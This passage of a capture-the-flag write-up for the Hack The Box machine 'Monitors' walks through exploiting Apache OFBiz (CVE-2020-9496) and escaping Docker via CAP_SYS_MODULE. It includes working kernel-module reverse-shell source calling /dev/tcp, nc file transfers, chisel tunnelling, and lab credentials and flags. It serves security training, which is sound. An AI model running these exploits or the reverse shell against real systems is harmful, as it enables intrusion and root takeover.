www-data@monitors:/usr/share/cacti/cacti$ stty rows 50 columns 158  
</code></pre></div><h2 id="system-enumeration">System enumeration</h2><p>Once connected to the machine, we can access MySQL database to check for credentials, and we find the password hash for <code>admin</code>, but it is neither crackable with <code>hashcat</code> nor <code>john</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@monitors:/usr/share/cacti/cacti$ mysql --user=wpadmin --password='BestAdministrator@2020!'  
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 3
Server version: 5.7.33-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0.00 sec)

mysql&gt; use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql&gt; describe wp_users;
+---------------------+---------------------+------+-----+---------------------+----------------+
| Field               | Type                | Null | Key | Default             | Extra          |
+---------------------+---------------------+------+-----+---------------------+----------------+
| ID                  | bigint(20) unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)         | NO   | MUL |                     |                |
| user_pass           | varchar(255)        | NO   |     |                     |                |
| user_nicename       | varchar(50)         | NO   | MUL |                     |                |
| user_email          | varchar(100)        | NO   | MUL |                     |                |
| user_url            | varchar(100)        | NO   |     |                     |                |
| user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(255)        | NO   |     |                     |                |
| user_status         | int(11)             | NO   |     | 0                   |                |
| display_name        | varchar(250)        | NO   |     |                     |                |
+---------------------+---------------------+------+-----+---------------------+----------------+
10 rows in set (0.00 sec)

mysql&gt; select user_login, user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$Be7cx.OsLozVI5L6DD60LLZNoHW9dZ0 |
+------------+------------------------------------+
1 row in set (0.00 sec)
</code></pre></div><p>Using <code>ifconfig</code> we see that the machine has Docker containers running, because there is a subnet called <code>docker0</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@monitors:/usr/share/cacti/cacti$ ifconfig
...

docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:3dff:fee9:d62f  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 02:42:3d:e9:d6:2f  txqueuelen 0  (Ethernet)
        RX packets 2637  bytes 192831 (192.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4213  bytes 3273053 (3.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 10.10.10.238  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:d51b  prefixlen 64  scopeid 0x20&lt;link&gt;
        inet6 dead:beef::250:56ff:feb9:d51b  prefixlen 64  scopeid 0x0&lt;global&gt;  
        ether 00:50:56:b9:d5:1b  txqueuelen 1000  (Ethernet)
        RX packets 18062  bytes 7956984 (7.9 MB)
        RX errors 0  dropped 70  overruns 0  frame 0
        TX packets 7700  bytes 4809781 (4.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

...
</code></pre></div><h3 id="analyzing-the-docker-container">Analyzing the Docker container</h3><p>Actually, there is a Docker container at <code>172.17.0.2</code>. We can transfer <code>nmap</code> as a static binary file to the machine to do a port scanning on the machine and on the container.</p><p>As the machine has <code>nc</code>, it can be used to transfer the file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> 10.10.10.238 1234 &lt; <span class="mtku">nmap</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@monitors:/usr/share/cacti/cacti$ cd /tmp
www-data@monitors:/tmp$ which nc
/bin/nc
www-data@monitors:/tmp$ nc -nlvp 1234 &gt; .nmap
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 10.10.17.44 64550 received!
www-data@monitors:/tmp$ chmod +x .nmap
www-data@monitors:/tmp$ ./.nmap -p- localhost

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-07-03 19:12 UTC  
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000078s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
4444/tcp open  unknown
8080/tcp open  http-alt
8443/tcp open  unknown
9988/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
www-data@monitors:/tmp$ ./nmap -p- 172.17.0.2

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-07-03 19:13 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.2
Host is up (0.00014s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
8080/tcp  open  http-alt
8443/tcp  open  unknown
38279/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.37 seconds
</code></pre></div><p>Now, we can use <a target="_blank" href="https://github.com/jpillora/chisel"><code>chisel</code></a> to do a port forwarding and access the web server at the container from the attacker machine:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> 10.10.10.238 1234 &lt; <span class="mtku">chisel</span>

<span class="code-cyan">$</span> <span class="code-dark-green">./chisel</span> server -p 1337 --reverse
server: Reverse tunnelling enabled
server: Fingerprint lEVau5AqQ5yJn+cIJcdKHCOmSYVFY67kTuCt1JtmjtY=  
server: Listening on http://0.0.0.0:1337
server: session#1: tun: proxy#R:8443=>8443: Listening
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@monitors:/tmp$ nc -nlvp 1234 &gt; .chisel
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 10.10.17.44 64550 received!
www-data@monitors:/tmp$ chmod +x .chisel
www-data@monitors.htb:/tmp$ ./.chisel client 10.10.17.44:1337 R:8443:172.17.0.2:8443  
client: Connecting to ws://10.10.17.44:1337
client: Connected (Latency 109.928393ms)
</code></pre></div><p>The Docker container is running a web server at ports 8080 and 8443. We can use <code>gobuster</code> from the machine (transfering the binary file and the wordlist again with <code>nc</code>) and discover see some directories:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gobuster</span> dir -u https://127.0.0.1:8443 -k -w $WORDLISTS/directory-list-2.3-medium.txt -q  
/images               <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /images/]</span>
/content              <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /content/]</span>
/common               <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /common/]</span>
/catalog              <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /catalog/]</span>
/marketing            <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /marketing/]</span>
/ecommerce            <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /ecommerce/]</span>
/ap                   <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /ap/]</span>
/ar                   <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /ar/]</span>
/ebay                 <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /ebay/]</span>
/manufacturing        <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /manufacturing/]</span>
/passport             <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /passport/]</span>
/example              <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /example/]</span>
/bi                   <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /bi/]</span>
/accounting           <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /accounting/]</span>
/webtools             <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /webtools/]</span>
/tomahawk             <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /tomahawk/]</span>
/facility             <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /facility/]</span>
/myportal             <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /myportal/]</span>
/sfa                  <span class="code-dark-cyan">(Status: 302)</span> [Size: 0] <span class="code-dark-blue">[--&gt; /sfa/]</span>
...
</code></pre></div><p>This server is running Apache OFBiz 17.12.01:</p><p><img alt="Monitors 5" src="/images/HTB/Monitors/Monitors-5.webp"></p><p>The following response is weird, but the shown credentials are not valid.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> https://localhost:8443/webtools/control/main -k
...
&lt;div class="screenlet-body"&gt;
    &lt;div&gt;For something interesting make sure you are logged in, try username: admin, password: ofbiz.&lt;/div&gt;
    &lt;br /&gt;
    &lt;div&gt;NOTE: If you have not already run the installation data loading script, from the ofbiz home directory run &quot;gradlew loadAll&quot; or &quot;java -jar build&#x2f;libs&#x2f;ofbiz.jar -l&quot;&lt;/div&gt;  
    &lt;br /&gt;
    &lt;div&gt;&lt;a href="https://localhost:8443/webtools/control/checkLogin"&gt;Login&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;
...
</code></pre></div><h3 id="exploiting-ofbiz">Exploiting OFBiz</h3><p>Searching on the Internet for exploits, we can find this GitHub repository: <a target="_blank" href="https://github.com/g33xter/CVE-2020-9496">CVE-2020-9496</a> containing a Proof of Concept (PoC) for exploiting unsafe Java deserialization through XML-RPC in OFBiz 17.12.01 using <a target="_blank" href="https://github.com/frohoff/ysoserial">ysoserial</a>.</p><p>For convenience, the shown PoC was rewritten into a Bash script called <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Monitors/deserialization.sh"><code>deserialization.sh</code></a> to execute it easier (detailed explanation <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Monitors#deserializationsh">here</a>).</p><p>We need to create a simple web server using Python to serve a file containing a reverse shell command:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...  
</code></pre></div><p>And a <code>nc</code> listener, we gain access to the Docker container. Then we run the script:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">deserialization.sh</span> 10.10.17.44 4444 <span class="mtku">ysoserial.jar</span>  
</code></pre></div><p>And get the connection:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.238.
Ncat: Connection from 10.10.10.238:39228.
bash: cannot set terminal process group (31): Inappropriate ioctl for device  
bash: no job control in this shell
root@83f0eae4b35a:/usr/src/apache-ofbiz-17.12.01# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@83f0eae4b35a:/usr/src/apache-ofbiz-17.12.01# ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
root@83f0eae4b35a:/usr/src/apache-ofbiz-17.12.01# export TERM=xterm
root@83f0eae4b35a:/usr/src/apache-ofbiz-17.12.01# export SHELL=bash
root@83f0eae4b35a:/usr/src/apache-ofbiz-17.12.01# stty rows 50 columns 158
</code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2><p>The next step is to perform a Docker container escape. This container has <code>CAP_SYS_MODULE</code> capability enabled, so as explained in <a target="_blank" href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_sys_module">HackTricks</a>:</p><blockquote><p>The container has SYS_MODULE capability. As a result, the container can insert/remove kernel modules in/from the kernel of the Docker host machine.</p></blockquote><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@4e5701e892a5:/usr/src/apache-ofbiz-17.12.01# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip  
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=
</code></pre></div><h3 id="escaping-from-the-docker-container">Escaping from the Docker container</h3><p>Following the article, we can create the following <code>reverse-shell.c</code> and <code>Makefile</code> archives and transfer them to the Docker container (first to the machine using <code>nc</code> and then exposing an HTTP server in the machine and using <code>curl</code> from the container).</p><ul><li><code>reverse-shell.c</code>:</li></ul><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#include</span><span class="mtk1"> </span><span class="mtk4">&lt;linux/kmod.h&gt;</span>
<span class="mtk5">#include</span><span class="mtk1"> </span><span class="mtk4">&lt;linux/module.h&gt;</span>

<span class="mtk8">MODULE_LICENSE</span><span class="mtk1">(</span><span class="mtk4">"GPL"</span><span class="mtk1">);</span>
<span class="mtk8">MODULE_AUTHOR</span><span class="mtk1">(</span><span class="mtk4">"AttackDefense"</span><span class="mtk1">);</span>
<span class="mtk8">MODULE_DESCRIPTION</span><span class="mtk1">(</span><span class="mtk4">"LKM reverse shell module"</span><span class="mtk1">);</span>
<span class="mtk8">MODULE_VERSION</span><span class="mtk1">(</span><span class="mtk4">"1.0"</span><span class="mtk1">);</span>

<span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> argv</span><span class="mtk5">[]</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> { </span><span class="mtk4">"/bin/bash"</span><span class="mtk1">, </span><span class="mtk4">"-c"</span><span class="mtk1">, </span><span class="mtk4">"bash -i &gt;&amp; /dev/tcp/172.17.0.2/4444 0&gt;&amp;1"</span><span class="mtk1">, </span><span class="mtk6">NULL</span><span class="mtk1"> };</span>  
<span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> envp</span><span class="mtk5">[]</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> { </span><span class="mtk4">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/us</span><span class="mtk4">r/bin:/sbin:/bin"</span><span class="mtk1">, </span><span class="mtk6">NULL</span><span class="mtk1"> };</span>

<span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">int</span><span class="mtk1"> __init </span><span class="mtk8">reverse_shell_init</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">call_usermodehelper</span><span class="mtk1">(argv[</span><span class="mtk6">0</span><span class="mtk1">], argv, envp, UMH_WAIT_EXEC);</span>
<span class="mtk1">}</span>

<span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">void</span><span class="mtk1"> __exit </span><span class="mtk8">reverse_shell_exit</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk8">printk</span><span class="mtk1">(KERN_INFO </span><span class="mtk4">"Exiting</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">}</span>

<span class="mtk8">module_init</span><span class="mtk1">(reverse_shell_init);</span>
<span class="mtk8">module_exit</span><span class="mtk1">(reverse_shell_exit);</span>
</code></pre></div><ul><li><code>Makefile</code>:</li></ul><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">obj-m +=reverse-shell.o</span>

<span class="mtk8">all</span><span class="mtk1">:</span>
<span class="mtk1">        make -C /lib/modules/</span><span class="mtk4">$(</span><span class="mtk7">shell</span><span class="mtk4"> uname -r)</span><span class="mtk1">/build M=</span><span class="mtk4">$(</span><span class="mtk1">PWD</span><span class="mtk4">)</span><span class="mtk1"> modules</span>  
<span class="mtk8">clean</span><span class="mtk1">:</span>
<span class="mtk1">        make -C /lib/modules/</span><span class="mtk4">$(</span><span class="mtk7">shell</span><span class="mtk4"> uname -r)</span><span class="mtk1">/build M=</span><span class="mtk4">$(</span><span class="mtk1">PWD</span><span class="mtk4">)</span><span class="mtk1"> clean</span>
</code></pre></div><p>Now, we transfer the files to build the kernel module:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@4e5701e892a5:/tmp# curl 10.10.10.238:8000/reverse.c -so reverse.c  
root@4e5701e892a5:/tmp# curl 10.10.10.238:8000/Makefile -so Makefile
</code></pre></div><p>Next, we build the kernel module and run it (while listening with <code>nc</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@4e5701e892a5:/tmp# make
make -C /lib/modules/4.15.0-142-generic/build M=/tmp modules
make[1]: Entering directory '/usr/src/linux-headers-4.15.0-142-generic'  
  CC [M]  /tmp/reverse-shell.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /tmp/reverse-shell.mod.o
  LD [M]  /tmp/reverse-shell.ko
make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-142-generic'
root@4e5701e892a5:/tmp# insmod reverse-shell.ko
</code></pre></div><p>And finally get the two flags:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.238.
Ncat: Connection from 10.10.10.238:40580.
bash: cannot set terminal process group (-1): Inappropriate ioctl for device  
bash: no job control in this shell
root@monitors:/# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@monitors:/# ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
root@monitors:/# export TERM=xterm
root@monitors:/# export SHELL=bash
root@monitors:/# stty rows 50 columns 158
root@monitors:/# cat /home/marcus/user.txt
efecb015501176da1d8423d3843cfd6b
root@monitors:/# cat /root/root.txt
5650dab3b397032cb92cd8c859e069d1
</code></pre></div><h2 id="intended-way-to-own-usertxt">Intended way to own <code>user.txt</code></h2><p>There was no need to get <code>user.txt</code> before <code>root.txt</code>. To get <code>user.txt</code> it was needed to find a Bash script inside the <code>/home/marcus/.backup</code> directory:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@monitors:/home/marcus$ ls -la
total 40
drwxr-xr-x 5 marcus marcus 4096 Jan 25 15:39 .
drwxr-xr-x 3 root   root   4096 Nov 10  2020 ..
d--x--x--x 2 marcus marcus 4096 Nov 10  2020 .backup
lrwxrwxrwx 1 root   root      9 Nov 10  2020 .bash_history -> /dev/null  
-rw-r--r-- 1 marcus marcus  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 marcus marcus 3771 Apr  4  2018 .bashrc
drwx------ 2 marcus marcus 4096 Jan 25 15:39 .cache
drwx------ 3 marcus marcus 4096 Nov 10  2020 .gnupg
-rw-r--r-- 1 marcus marcus  807 Apr  4  2018 .profile
-r--r----- 1 root   marcus   84 Jan 25 14:59 note.txt
-r--r----- 1 root   marcus   33 Jul  4 12:16 user.txt
</code></pre></div><p>Since the directory has only <code>x</code> permissions, files inside could only be read if the full filename is provided. As the directory is called <code>.backup</code>, the files inside could be guessed until the correct one is found:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@monitors:/home/marcus$ cat .backup/backup.sh  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>

<span class="mtk1">backup_name=</span><span class="mtk4">"cacti_backup"</span>
<span class="mtk1">config_pass=</span><span class="mtk4">"VerticalEdge2020"</span>

<span class="mtk1">zip /tmp/${backup_name}.zip /usr/share/cacti/cacti</span><span class="mtk1">/</span><span class="mtk5">*</span>
<span class="mtk1">sshpass -p </span><span class="mtk4">"</span><span class="mtk1">${config_pass}</span><span class="mtk4">"</span><span class="mtk1"> scp /tmp/${backup_name} 192.168.1.14:/opt/backup_</span><span class="mtk1">collection/${backup_name}.zip</span>  
<span class="mtk1">rm /tmp/${backup_name}.zip</span>
</code></pre></div><p>So we can login as <code>marcus</code> with password <code>VerticalEdge2020</code> and get a hint to know that the Docker container might be vulnerable (<code>note.txt</code>). Moreover, now we could use SSH port forwarding instead of <a target="_blank" href="https://github.com/jpillora/chisel"><code>chisel</code></a>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@monitors:/home/marcus$ su marcus
Password:
marcus@monitors:~$ cat note.txt
TODO:

Disable phpinfo in php.ini              - DONE  
Update docker image for production use  -
marcus@monitors:~$ cat user.txt
efecb015501176da1d8423d3843cfd6b
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a><ul><li><a href="#exploiting-wordpress-spritz-plugin">Exploiting WordPress Spritz plugin</a></li></ul></li><li><a href="#foothold">Foothold</a><ul><li><a href="#exploiting-cacti">Exploiting Cacti</a></li></ul></li><li><a href="#system-enumeration">System enumeration</a><ul><li><a href="#analyzing-the-docker-container">Analyzing the Docker container</a></li><li><a href="#exploiting-ofbiz">Exploiting OFBiz</a></li></ul></li><li><a href="#privilege-escalation">Privilege escalation</a><ul><li><a href="#escaping-from-the-docker-container">Escaping from the Docker container</a></li></ul></li><li><a href="#intended-way-to-own-usertxt">Intended way to own <code>user.txt</code></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
